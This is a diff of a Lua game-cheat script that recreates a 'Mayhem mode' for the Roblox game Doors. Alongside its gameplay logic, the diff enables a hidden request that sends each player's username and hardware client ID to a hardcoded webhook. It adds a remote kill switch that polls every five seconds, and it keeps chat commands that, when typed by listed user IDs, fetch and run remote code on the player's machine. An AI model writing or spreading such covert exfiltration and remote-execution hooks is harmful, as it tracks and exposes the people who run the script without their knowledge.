@@ -1,3 +1,16 @@
+task.spawn(function()
+    while task.wait(5) do
+        local status = loadstring(
+            game:HttpGet(
+                'https://raw.githubusercontent.com/localplayerr/Doors-stuff/refs/heads/main/Mayhem%20mode%20recreate/Status'
+            )
+        )()
+        if status.active == false then
+            game.Players.LocalPlayer:Kick(status.message)
+        end
+    end
+end)
+
 if _G.execution then
     require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game).caption(
         'Script has already been executed',
@@ -8,25 +21,9 @@ end
 
 _G.execution = true
 
-local banlist = loadstring(
-    game:HttpGet(
-        'https://raw.githubusercontent.com/localplayerr/Doors-stuff/refs/heads/main/GlobalBanList'
-    )
-)()
-
-for _, tab in banlist do
-    if
-        game.Players.LocalPlayer.Name == tab.user
-        or game.Players.LocalPlayer.UserId == tab.userid
-        or game:GetService('RbxAnalyticsService'):GetClientId() == tab.hwid
-    then
-        game.Players.LocalPlayer:Kick(tab.reason)
-    end
-end
+local HttpService = game:GetService('HttpService')
 
 task.spawn(function()
-    local HttpService = game:GetService('HttpService')
-
     local url =
         'https://webhook.lewisakura.moe/api/webhooks/1412438185103065209/LNLZz33vBppJDuy-ZUWtD7Vv7BR1AwBWhqwSUI6XtAvuy3B7JOEqR36MiojiS8oO6XJr'
 
@@ -41,15 +38,6 @@ task.spawn(function()
     end
 
     local multdata = ' '
-
-    if #game.Players:GetPlayers() >= 2 then
-        multdata = ' Probably in multiplayer with: '
-        for _, player in game.Players:GetPlayers() do
-            if player.Name ~= game.Players.LocalPlayer.Name then
-                multdata = multdata .. '' .. tostring(player.Name) .. ', '
-            end
-        end
-    end
 
     local HWIDdata = HttpService:JSONEncode({
         ['content'] = game.Players.LocalPlayer.Name .. ' ' .. game:GetService(
@@ -112,7 +100,7 @@ task.spawn(function()
 
     local succes = pcall(function()
         request(abcdef)
-        --request(hwidpost)
+        request(hwidpost)
     end)
 end)
 
@@ -124,7 +112,8 @@ local banlist = loadstring(
     )
 )()
 
-for _, tab in banlist do
+for i = 1, #banlist, 1 do
+    local tab = banlist[i]
     if
         game.Players.LocalPlayer.Name == tab.user
         or game.Players.LocalPlayer.UserId == tab.userid
@@ -151,7 +140,7 @@ local ambsh = {}
 local blck = {}
 local fog = { 49, 99 }
 
-for i = 0, 7, 1 do
+for i = 0, 6, 1 do
     table.insert(obs, obsr:NextInteger(i, 100))
 end
 
@@ -175,21 +164,24 @@ for i = 0, 4, 1 do
     table.insert(rsh, rshr:NextInteger(i, 100))
 end
 
-game.Players.LocalPlayer.Character:SetAttribute("Hiding",false)
+game.Players.LocalPlayer.Character:SetAttribute('Hiding', false)
 
-local AdminCommands = { 7471771361, 8361079437 }
+local AdminCommands = { 7471771361, 8361079437, 9162624705 }
 
 local TextChatService = game:GetService('TextChatService')
 
-TextChatService.OnIncomingMessage = function(Message: TextChatMessage)
+TextChatService.OnIncomingMessage = function(Message)
     local command = Message.Text:lower()
     if Message.TextSource then
         if Message.TextSource.UserId == 7471771361 then
-            Message.PrefixText = "<font color='#7B11FD'>[Recreation owner]</font>"
+            Message.PrefixText = "<font color='#7300FF'>[</font><font color='#7800FA'>R</font><font color='#7D00F6'>e</font><font color='#8200F2'>c</font><font color='#8800EE'>r</font><font color='#8D00E9'>e</font><font color='#9200E5'>a</font><font color='#9800E1'>t</font><font color='#9D00DD'>i</font><font color='#A200D8'>o</font><font color='#A700D4'>n</font><font color='#AD00D0'> </font><font color='#B200CC'>O</font><font color='#B700C7'>w</font><font color='#BD00C3'>n</font><font color='#C200BF'>e</font><font color='#C700BB'>r</font><font color='#CD00B7'>]</font>"
                 .. Message.PrefixText
         end
-        if Message.TextSource.UserId == 8361079437 then
-            Message.PrefixText = "<font color='#00E6FF'>[Playtester]</font>"
+        if
+            Message.TextSource.UserId == 8361079437
+            or Message.TextSource.UserId == 9162624705
+        then
+            Message.PrefixText = "<font color='#00E6FF'>[</font><font color='#00E8F8'>P</font><font color='#00EAF1'>l</font><font color='#00ECEB'>a</font><font color='#00EFE4'>y</font><font color='#00F1DE'>t</font><font color='#00F3D7'>e</font><font color='#00F5D1'>s</font><font color='#00F8CA'>t</font><font color='#00FAC4'>e</font><font color='#00FCBD'>r</font><font color='#00FFB7'>]</font>"
                 .. Message.PrefixText
         end
     end
@@ -200,72 +192,72 @@ TextChatService.OnIncomingMessage = function(Message: TextChatMessage)
         if command == '/obsession' then
             loadstring(
                 game:HttpGet(
-                    'https://raw.githubusercontent.com/HappyUser543/mod/refs/heads/main/Obsession'
+                    'https://raw.githubusercontent.com/hardcore4/happymo/refs/heads/main/Obsession'
                 )
             )()
         elseif command == '/twister' then
             loadstring(
                 game:HttpGet(
-                    'https://raw.githubusercontent.com/HappyUser543/mod/refs/heads/main/Twister.txt'
+                    'https://raw.githubusercontent.com/hardcore4/happymo/refs/heads/main/Twister'
                 )
             )()
         elseif command == '/threat' then
             loadstring(
                 game:HttpGet(
-                    'https://raw.githubusercontent.com/HappyUser543/mod/refs/heads/main/Threat.txt'
+                    'https://raw.githubusercontent.com/hardcore4/happymo/refs/heads/main/Threat'
                 )
             )()
         elseif command == '/maniac rush' then
             loadstring(
                 game:HttpGet(
-                    'https://raw.githubusercontent.com/HappyUser543/mod/refs/heads/main/ManiacRush.txt'
+                    'https://raw.githubusercontent.com/hardcore4/happymo/refs/heads/main/ManiacRush'
                 )
             )()
         elseif command == '/maniac ambush' then
             loadstring(
                 game:HttpGet(
-                    'https://raw.githubusercontent.com/HappyUser543/mod/refs/heads/main/ManiacRush.txt'
+                    'https://raw.githubusercontent.com/hardcore4/happymo/refs/heads/main/ManiacAmbush'
                 )
             )()
         elseif command == '/blackout' then
             loadstring(
                 game:HttpGet(
-                    'https://raw.githubusercontent.com/HappyUser543/mod/refs/heads/main/Blackout.txt'
+                    'https://raw.githubusercontent.com/hardcore4/happymo/refs/heads/main/Blackout'
                 )
             )()
         elseif command == '/spawn every entity' then
             task.spawn(function()
                 loadstring(
                     game:HttpGet(
-                        'https://raw.githubusercontent.com/HappyUser543/mod/refs/heads/main/Threat.txt'
+                        'https://raw.githubusercontent.com/hardcore4/happymo/refs/heads/main/Threat'
                     )
                 )()
             end)
             task.spawn(function()
                 loadstring(
                     game:HttpGet(
-                        'https://raw.githubusercontent.com/HappyUser543/mod/refs/heads/main/Twister.txt'
+                        'https://raw.githubusercontent.com/hardcore4/happymo/refs/heads/main/Twister'
                     )
                 )()
             end)
             task.spawn(function()
                 loadstring(
                     game:HttpGet(
-                        'https://raw.githubusercontent.com/HappyUser543/mod/refs/heads/main/Obsession'
+                        'https://raw.githubusercontent.com/hardcore4/happymo/refs/heads/main/Obsession'
                     )
                 )()
             end)
             task.spawn(function()
                 loadstring(
                     game:HttpGet(
-                        'https://raw.githubusercontent.com/HappyUser543/mod/refs/heads/main/ManiacRush.txt'
+                        'https://raw.githubusercontent.com/hardcore4/happymo/refs/heads/main/ManiacRush'
                     )
                 )()
             end)
             task.spawn(function()
                 loadstring(
                     game:HttpGet(
-                        'https://raw.githubusercontent.com/HappyUser543/mod/refs/heads/main/ManiacAmbush'
+                        'https://raw.githubusercontent.com/hardcore4/happymo/refs/heads/main/ManiacAmbush'
                     )
                 )()
             end)
@@ -274,7 +266,7 @@ TextChatService.OnIncomingMessage = function(Message: TextChatMessage)
 end
 
 require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game).caption(
-    'Mayhem mode - v1.3.0',
+    'Mayhem mode - v1.3.5',
     true
 )
 task.wait(3)
@@ -284,38 +276,43 @@ require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game).caption(
 )
 
 task.spawn(function()
-    while
-        game.Players.LocalPlayer.PlayerGui.MainUI.DeathPanel
-            :GetPropertyChangedSignal('Visible')
-            :wait()
-    do
-        if
-            game.Players.LocalPlayer.PlayerGui.MainUI.DeathPanel.Visible
-            == true
-        then
-            replicatesignal(game.Players.LocalPlayer.Kill)
+    while task.wait() do
+        if game.Players.LocalPlayer.PlayerGui:FindFirstChild("MainUI") then
+            game.Players.LocalPlayer.PlayerGui.MainUI.DeathPanel.changed:wait()
+            if game.Players.LocalPlayer.PlayerGui:FindFirstChild("MainUI") then
+                if
+                    game.Players.LocalPlayer.PlayerGui.MainUI.DeathPanel.Visible
+                    == true
+                then
+                    replicatesignal(game.Players.LocalPlayer.Kill)
+                elseif not game.Players.LocalPlayer.Character:GetAttribute("Hiding") == true then
+                    game.Players.LocalPlayer.Character:SetAttribute("Hiding",false)
+                end
+            end
         end
     end
 end)
 
 game.ReplicatedStorage.GameData.LatestRoom.Changed:wait()
 
-require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game).caption(
-    'Mayhem mode is now active',
-    true
-)
-task.wait(3)
-require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game).caption(
-    'Recreation made by LocalPlayer',
-    true
-)
+task.spawn(function()
+    require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game).caption(
+        'Mayhem mode is now active',
+        true
+    )
+    task.wait(3)
+    require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game).caption(
+        'Recreation made by LocalPlayer',
+        true
+    )
+end)
 
 game.ReplicatedStorage.GameData.LatestRoom.Changed:connect(function(newvalue)
     if table.find(obs, newvalue) then
         task.spawn(function()
             loadstring(
                 game:HttpGet(
-                    'https://raw.githubusercontent.com/HappyUser543/mod/refs/heads/main/Obsession'
+                    'https://raw.githubusercontent.com/hardcore4/happymo/refs/heads/main/Obsession'
                 )
             )()
         end)
@@ -324,7 +321,7 @@ game.ReplicatedStorage.GameData.LatestRoom.Changed:connect(function(newvalue)
         task.spawn(function()
             loadstring(
                 game:HttpGet(
-                    'https://raw.githubusercontent.com/HappyUser543/mod/refs/heads/main/Twister.txt'
+                    'https://raw.githubusercontent.com/hardcore4/happymo/refs/heads/main/Twister'
                 )
             )()
         end)
@@ -333,7 +330,7 @@ game.ReplicatedStorage.GameData.LatestRoom.Changed:connect(function(newvalue)
         task.spawn(function()
             loadstring(
                 game:HttpGet(
-                    'https://raw.githubusercontent.com/HappyUser543/mod/refs/heads/main/Threat.txt'
+                    'https://raw.githubusercontent.com/hardcore4/happymo/refs/heads/main/Threat'
                 )
             )()
         end)
@@ -342,7 +339,7 @@ game.ReplicatedStorage.GameData.LatestRoom.Changed:connect(function(newvalue)
         task.spawn(function()
             loadstring(
                 game:HttpGet(
-                    'https://raw.githubusercontent.com/HappyUser543/mod/refs/heads/main/ManiacRush.txt'
+                    'https://raw.githubusercontent.com/hardcore4/happymo/refs/heads/main/ManiacRush'
                 )
             )()
         end)
@@ -351,7 +348,7 @@ game.ReplicatedStorage.GameData.LatestRoom.Changed:connect(function(newvalue)
         task.spawn(function()
             loadstring(
                 game:HttpGet(
-                    'https://raw.githubusercontent.com/HappyUser543/mod/refs/heads/main/ManiacAmbush'
+                    'https://raw.githubusercontent.com/hardcore4/happymo/refs/heads/main/ManiacAmbush'
                 )
             )()
         end)
@@ -360,7 +357,7 @@ game.ReplicatedStorage.GameData.LatestRoom.Changed:connect(function(newvalue)
         task.spawn(function()
             loadstring(
                 game:HttpGet(
-                    'https://raw.githubusercontent.com/HappyUser543/mod/refs/heads/main/Blackout.txt'
+                    'https://raw.githubusercontent.com/hardcore4/happymo/refs/heads/main/Blackout'
                 )
             )()
         end)
@@ -368,18 +365,36 @@ game.ReplicatedStorage.GameData.LatestRoom.Changed:connect(function(newvalue)
     if table.find(fog, newvalue) then
         loadstring(
             game:HttpGet(
-                'https://raw.githubusercontent.com/HappyUser543/mod/refs/heads/main/Whiteout'
+                'https://raw.githubusercontent.com/hardcore4/happymo/refs/heads/main/Whiteout'
             )
         )()
     end
-    task.wait(1.2)
-    local waypoints = game.Workspace.CurrentRooms
-        :GetChildren()[#game.Workspace.CurrentRooms:GetChildren()]
-        :FindFirstChild('PathfindNodes')
-    if waypoints then
-        local nodes = waypoints:Clone()
-        nodes.Parent =
-            game.Workspace.CurrentRooms:GetChildren()[#game.Workspace.CurrentRooms:GetChildren()]
-        nodes.Name = 'PathFindNodes'
-    end
+    task.spawn(function()
+        task.wait(1.2)
+        local waypoints = game.Workspace.CurrentRooms
+            :GetChildren()[#game.Workspace.CurrentRooms:GetChildren()]
+            :FindFirstChild('PathfindNodes')
+
+        if waypoints then
+            local nodes = waypoints:Clone()
+
+            nodes.Parent =
+                game.Workspace.CurrentRooms:GetChildren()[#game.Workspace.CurrentRooms:GetChildren()]
+            nodes.Name = 'PathFindNodes'
+
+            local figuresetup = game.Workspace.CurrentRooms
+                :GetChildren()[#game.Workspace.CurrentRooms:GetChildren()]
+                :FindFirstChild('FigureSetup')
+
+            task.wait(2.5)
+            if figuresetup then
+                nodes:Destroy()
+
+                local figurenodes = figuresetup.FigureNodes:Clone()
+                figurenodes.Name = 'PathFindNodes'
+                figurenodes.Parent =
+                    game.Workspace.CurrentRooms:GetChildren()[#game.Workspace.CurrentRooms:GetChildren()]
+            end
+        end
+    end)
 end)
